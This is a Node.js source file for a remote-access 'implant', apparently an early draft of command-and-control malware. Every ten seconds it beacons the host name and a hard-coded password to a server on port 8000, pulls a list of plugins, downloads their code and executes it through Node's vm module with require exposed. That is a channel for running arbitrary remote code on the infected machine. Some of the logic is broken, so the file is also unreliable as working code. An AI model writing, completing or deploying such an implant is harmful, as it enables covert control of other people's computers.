const http = require('node:http');
const os = require('node:os');
const util = require('node:util');
const vm = require('node:vm');

const PL = "PluginsToLoad";
const IN = "implant_name";
const PN = "plugin_name";
const PC = "plugin_content";
const CP = "client_password";

var implant = {};
implant[PL] = [];
implant[IN] = os.hostname();

var run_plugins = function() {
    //TODO Create the correct sandbox to support all plugins that could be written
    const sandbox = {
        require,
        console
    };
    implant[PL].forEach(element => {
        const script = new vm.Script(implant[PL][element]);
        const context = new vm.createContext(sandbox);
        script.runInNewContext(context);
        // eval(implant[PL][element]);
    });
};

var download_plugins = function() {
    var options = {
        hostname: 'localhost',
        port: 8000,
        path: '/plugin/',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
    };

    implant[PL].forEach(element => {
        const postData = JSON.stringify({
            IN: implant[IN],
            PN: element
        });
        options['headers']['Content-Length'] = Buffer.byteLength(postData);

        const req = http.request(options, (res) => {
            console.log(`STATUS: ${res.statusCode}`);
            console.log(`HEADERS: ${JSON.stringify(res.headers)}`);
            res.setEncoding('utf8');
            var chucked_data = "";
            res.on('data', (chunk) => {
                console.log(`BODY: ${chunk}`);
                chucked_data+=chunk;
            });
            res.on('end', () => {
                console.log('No more data in response.');
                implant[element] = chucked_data;
            });
        });
    
        req.on('error', (e) => {
            console.error(`problem with request: ${e.message}`);
        });

        req.write(postData);
        req.end();
    });

};

var heartbeat = function() {
    const postData = JSON.stringify({
        IN: implant[IN],
        CP: 'secret'
    });

    const options = {
        hostname: 'localhost',
        port: 8000,
        path: '/whoami.js',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(postData),
        },
    };

    const req = http.request(options, (res) => {
        console.log(`STATUS: ${res.statusCode}`);
        console.log(`HEADERS: ${JSON.stringify(res.headers)}`);
        res.setEncoding('utf8');
        var chucked_data = "";
        res.on('data', (chunk) => {
            console.log(`BODY: ${chunk}`);
            chucked_data+=chunk;
        });
        res.on('end', () => {
            console.log('No more data in response.', chucked_data);
            implant[PL] = JSON.parse(chucked_data);
            download_plugins();
            run_plugins();
        });
    });

    req.on('error', (e) => {
        console.error(`problem with request: ${e.message}`);
    });

    req.write(postData);
    req.end();
}

setInterval(heartbeat, 10000);